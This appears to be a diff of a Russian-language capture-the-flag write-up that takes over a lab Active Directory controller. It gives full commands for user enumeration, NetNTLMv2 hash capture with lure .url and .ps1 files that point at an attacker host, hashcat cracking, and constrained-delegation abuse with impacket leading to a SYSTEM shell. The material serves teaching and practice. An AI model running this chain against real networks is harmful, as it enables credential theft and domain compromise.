@@ -2,19 +2,19 @@
 
 ### Необходимые навыки
 
-- Перечисление Active Directory: BloodHound, enum4linux-ng, kerbrute, nxc
-- Работа с Kerberos: AS-REP Roasting, Kerberoasting, ограниченное делегирование (constrained delegation)
-- Захват NetNTLMv2-хэша через поддельный .url/.ps1-файл и Responder
-- Работа с impacket: getST, psexec
+- Перечисление Active Directory: BloodHound, `enum4linux-ng`, `kerbrute`, `nxc` (NetExec)
+- Работа с Kerberos: понимание механизмов AS-REP Roasting, Kerberoasting и **ограниченного делегирования (Constrained Delegation)**
+- Захват NetNTLMv2-хэша через поддельные файлы-триггеры (`.url` / `.ps1`) и Responder
+- Работа с `impacket`: `getST`, `psexec`
 
 ---
 
-### Перечисление
+### Перечисление и разведка
 
 Начинаем со сканирования портов:
 
-```
-rustscan --ulimit 5000 --range 0-65535 -a ip -- -O -sC -sV -oX proxy.xml
+```bash
+rustscan --ulimit 5000 --range 0-65535 -a <IP-цели> -- -O -sC -sV -oX proxy.xml
 PORT      STATE SERVICE       REASON          VERSION
 53/tcp    open  domain        syn-ack ttl 126 Simple DNS Plus
 88/tcp    open  kerberos-sec  syn-ack ttl 126 Microsoft Windows Kerberos (server time: 2026-07-08 11:53:20Z)
@@ -32,40 +32,43 @@ PORT      STATE SERVICE       REASON          VERSION
 |   NetBIOS_Computer_Name: DC01
 |   DNS_Domain_Name: ctf.local
 |   DNS_Computer_Name: DC01.ctf.local
-|   DNS_Tree_Name: ctf.local
-|   Product_Version: 10.0.17763
-|_  System_Time: 2026-07-08T11:54:16+00:00
-7680/tcp  open  pando-pub?    syn-ack ttl 126
-9389/tcp  open  mc-nmf        syn-ack ttl 126 .NET Message Framing
-49668/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
-49676/tcp open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
+...
 ```
 
-Имя компьютера `DC01.ctf.local` и набор портов однозначно указывают на контроллер домена. Наибольший интерес представляют LDAP, Kerberos, SMB и RPC.
+Имя компьютера `DC01.ctf.local` и характерный набор портов (53, 88, 389, 445, 3268) однозначно указывают на Контроллер Домена (Domain Controller).
+Попытка выгрузить зону DNS (`dig axfr @<IP-цели> ctf.local`) показывает, что в домене зарегистрирован только сам DC.
 
-Запрашиваем все записи DNS через zone transfer, чтобы понять топологию сети: `dig axfr @ip ctf.local` — оказывается, в домене только сам DC.
-
-Запускаем расширенное перечисление:
-
-`enum4linux-ng -A ip -oA enum_proxy.txt`
-
-Нулевая сессия RPC доступна, но команды `querydispinfo` и `enumdomuser` возвращают `NT_STATUS_ACCESS_DENIED` — много из неё не вытащить. Попытки RID-брутфорса через SMB (`nxc smb ip -u '' -p '' --rid-brute 2000`) и перечисление через LDAP без аутентификации — тоже без результата.
-
-Пробуем вытащить имена пользователей через Kerberos:
-
+Запускаем расширенное перечисление через `enum4linux-ng`:
+```bash
+enum4linux-ng -A <IP-цели> -oA enum_proxy.txt
 ```
-kerbrute userenum --dc ip -d ctf.local /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt
+Хотя нулевая сессия (Null Session) RPC частично доступна, критические команды (вроде `enumdomuser`) возвращают `NT_STATUS_ACCESS_DENIED`. Брутфорс RID через SMB (`nxc smb <IP> -u '' -p '' --rid-brute 2000`) и анонимное перечисление LDAP также терпят неудачу.
+
+#### Энумерация пользователей через Kerberos
+
+Так как анонимный SMB/LDAP закрыт, используем `kerbrute` для перебора валидных имен пользователей через механизмы Kerberos (запросы AS-REQ):
+
+```bash
+kerbrute userenum --dc <IP-цели> -d ctf.local /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt
 
 2026/07/08 15:43:16 >  [+] VALID USERNAME:       guest@ctf.local
 2026/07/08 15:43:16 >  [+] VALID USERNAME:       administrator@ctf.local
 ```
 
-Проверяем гостевую запись: `nxc smb ip -u guest -p ''` — учётная запись активна и не требует пароля. AS-REP Roasting для администратора не работает (флаг `UF_DONT_REQUIRE_PREAUTH` не выставлен), Kerberoasting через гостевую учётку тоже недоступен — не хватает прав в LDAP для запроса SPN.
-
-Смотрим SMB-шары с гостевым аккаунтом:
-
+Проверяем гостевую учетную запись через NetExec (`nxc`): 
+```bash
+nxc smb <IP-цели> -u guest -p ''
 ```
-smbmap -H ip -u 'guest' -p ''
+Учётная запись `guest` активна и не требует пароля. 
+
+*(Примечание: Атаки AS-REP Roasting и Kerberoasting на данном этапе не применимы: для AS-REP Roasting у администратора не установлен флаг `DONT_REQ_PREAUTH`, а для Kerberoasting у пользователя `guest` недостаточно прав для выполнения LDAP-запросов на получение SPN).*
+
+#### Анализ SMB-шар
+
+Проверяем доступные сетевые папки от имени гостя:
+
+```bash
+smbmap -H <IP-цели> -u 'guest' -p ''
         Disk                                                    Permissions     Comment
         ----                                                    -----------     -------
         ADMIN$                                                  NO ACCESS       Remote Admin
@@ -76,87 +79,105 @@ smbmap -H ip -u 'guest' -p ''
         SYSVOL                                                  NO ACCESS       Logon server share 
 ```
 
-Шара `IT-Shared` с правами на запись — интересно. Подключаемся:
-
-`smbclient //ip/IT-Shared -U 'ctf.local\guest%'`
-
-В файлах два полезных момента: несколько якобы устаревших паролей и описание службы сканирования:
-
+Обнаружена нестандартная директория `IT-Shared` с правами на запись (WRITE). Подключаемся через `smbclient`:
+```bash
+smbclient //10.112.x.x/IT-Shared -U 'ctf.local\guest%'
 ```
-smb: \> get IT-Onboarding-Checklist.txt -
+Внутри находим текстовый файл `IT-Onboarding-Checklist.txt`, содержащий несколько паролей (вероятно, устаревших) и описание служебного процесса:
+
+```text
   File Scanner (svc.scanner)
     Runs every 2 minutes. Enumerates IT-Shared for new files to process.
     Uses Shell enumeration to inspect file metadata and icons.
     Contact sysadmin if files are not being processed.
 ```
 
+Распыление найденных паролей (Password Spraying) не дало результатов. Однако информация о службе `svc.scanner` — это прямой вектор атаки.
+
 ---
 
-### Захват хэша
+### Захват хэша (LLMNR/NBT-NS Poisoning & SMB Relay/Capture)
 
-Распыляем полученные пароли по известным учётным записям: `nxc smb ip -u administrator -p pass.txt` — ни один не подошёл.
+Служба каждые 2 минуты сканирует директорию `IT-Shared` и извлекает метаданные/иконки файлов. Это классический сценарий для захвата хэша NetNTLMv2. Если мы подложим файл, который попытается загрузить ресурс (иконку) с нашей атакующей машины, служба `svc.scanner` автоматически отправит нам свои учетные данные в попытке аутентификации.
 
-Раз служба каждые 2 минуты обходит шару и обрабатывает файлы через Shell (то есть, скорее всего, инициирует сетевые подключения), пробуем поймать NetNTLMv2-хэш. Запускаем Responder:
-
-`sudo responder -I tun0`
-
-Кладём в шару .url-файл с указанием на нашу машину в поле иконки:
-
+Подготавливаем слушатель `Responder`:
+```bash
+sudo responder -I tun0
 ```
-cat > @Shortcut.url << 'EOF'
+
+Сначала создаем классический файл-приманку (`.url` ярлык):
+```bash
+cat > @Shortcut.url << 'END_OF_URL'
 [InternetShortcut]
 URL=http://ctf.local
 WorkingDirectory=ctf
-IconFile=\\ip\icons\icon.ico
+IconFile=\\<IP-атакующего>\icons\icon.ico
 IconIndex=1
-EOF
+END_OF_URL
+```
+Загружаем его в `IT-Shared` (`put @Shortcut.url`). Хэш не приходит — вероятно, механизм "Shell enumeration" на целевой машине не загружает удаленные иконки для ярлыков.
+
+Меняем тактику. Вместо ярлыка загружаем PowerShell-скрипт, при обработке которого сканер может триггернуть сетевое обращение:
+```bash
+echo 'Test-Path \\<IP-атакующего>\icons\icon.ico' > trigger.ps1
 ```
 
-`put @Shortcut.url`
+Метод срабатывает. Responder перехватывает аутентификацию службы:
+```text
+[SMB] NTLMv2-SSP Hash : svc.scanner::CTF:3e5e...
+```
 
-Хэш не пришёл — вероятно, служба не загружает иконки при обработке файлов. Меняем подход: кладём PowerShell-скрипт, который явно обращается к нашей шаре:
-
-`echo 'Test-Path \\ip\icons\icon.ico' > trigger.ps1`
-
-На этот раз срабатывает. Responder ловит NetNTLMv2-хэш:
-
-`NTLMv2-SSP Hash : svc.scanner::CTF:3e5e...`
-
-Пробуем взломать оффлайн:
-
-`hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt`
-
-Пароль найден. Однако подключиться напрямую к машине через WinRM, RDP или psexec не выходит — у `svc.scanner` нет нужных прав.
+Взламываем полученный хэш локально с помощью `hashcat`:
+```bash
+hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
+```
+Пароль успешно восстановлен. Проверка показывает, что у пользователя `svc.scanner` нет прямых прав на подключение через WinRM, RDP или psexec. Требуется дальнейшая эскалация привилегий в рамках Active Directory.
 
 ---
 
-### Эксплуатация делегирования
+### Эксплуатация ограниченного делегирования (Constrained Delegation)
 
-Собираем полный граф объектов домена через BloodHound:
+Используя полученные учетные данные `svc.scanner`, собираем структуру Active Directory с помощью `BloodHound`:
 
-```
-bloodhound-python -u svc.scanner -p '***' -d ctf.local -ns ip -c All --zip
+```bash
+bloodhound-python -u svc.scanner -p '<СЕКРЕТНЫЙ_ПАРОЛЬ>' -d ctf.local -ns <IP-цели> -c All --zip
 ./bloodhound-cli containers start
 ```
 
-Загружаем архив в интерфейс, строим путь до Administrator:
+Импортируем данные в BloodHound и анализируем кратчайший путь до `Domain Admins` / `Administrator`:
 
 <img width="1627" height="450" alt="image" src="https://github.com/user-attachments/assets/242ae21d-f168-4fe1-b152-a0e6a98a4efa" />
 
-Граф показывает:
+Граф выявляет критическую уязвимость:
+- Учетная запись `svc.scanner` имеет привилегию **AllowedToDelegate** на контроллер домена `DC01`. 
+- Это означает, что в домене настроено *Ограниченное делегирование (Constrained Delegation)*. Учетная запись `svc.scanner` может использовать расширение протокола Kerberos (S4U2Proxy), чтобы запросить Service Ticket (TGS) от имени *любого пользователя* (в том числе Administrator) к службе на `DC01`.
 
-- `SVC.SCANNER` → `DC01` по ребру **AllowedToDelegate**: учётная запись службы имеет право ограниченного делегирования на контроллер домена. Это означает возможность запросить билет Kerberos от имени любого пользователя домена для доступа к службам DC — в том числе от имени Administrator.
-- `DC01` → домен по ребру **CoerceToTGT**: компрометация DC фактически означает компрометацию всего домена (доступ к NTDS.dit с хэшами всех пользователей).
+#### Процесс эксплуатации (через S4U2Proxy)
 
-Выпускаем билет для Administrator через S4U2Proxy:
-
+1. Обновляем `/etc/hosts` для корректного разрешения имен Kerberos:
+```bash
+echo "<IP-цели> dc01.ctf.local dc01" | sudo tee -a /etc/hosts
 ```
-echo "ip dc01.ctf.local dc01" | sudo tee -a /etc/hosts
-impacket-getST ctf.local/svc.scanner:'***' -spn cifs/dc01.ctf.local -impersonate Administrator -dc-ip ip
+
+2. Запрашиваем Service Ticket (TGS) от имени `Administrator` к службе `cifs` на `dc01.ctf.local`, используя учетные данные `svc.scanner`. Инструмент `impacket-getST` автоматически проведет S4U2Self (получение билета для себя от имени админа) и S4U2Proxy (конвертация этого билета в билет для доступа к целевой службе):
+```bash
+impacket-getST ctf.local/svc.scanner:'<СЕКРЕТНЫЙ_ПАРОЛЬ>' -spn cifs/dc01.ctf.local -impersonate Administrator -dc-ip <IP-цели>
+```
+
+3. Экспортируем полученный билет в переменную окружения, чтобы `impacket` мог использовать его для аутентификации (Pass-the-Ticket):
+```bash
 export KRB5CCNAME=Administrator@cifs_dc01.ctf.local@CTF.LOCAL.ccache
+```
+
+4. Подключаемся к контроллеру домена через `psexec`, используя только билет Kerberos (`-k -no-pass`):
+```bash
 impacket-psexec -k -no-pass dc01.ctf.local
 ```
 
-Получаем shell от имени Administrator. Забираем флаг:
+Мы получаем `NT AUTHORITY\SYSTEM` оболочку на контроллере домена.
 
-`type C:\Users\Administrator\Desktop\flag.txt`
+Забираем финальный флаг:
+```cmd
+type C:\Users\Administrator\Desktop\flag.txt
+```
+Машина успешно пройдена.
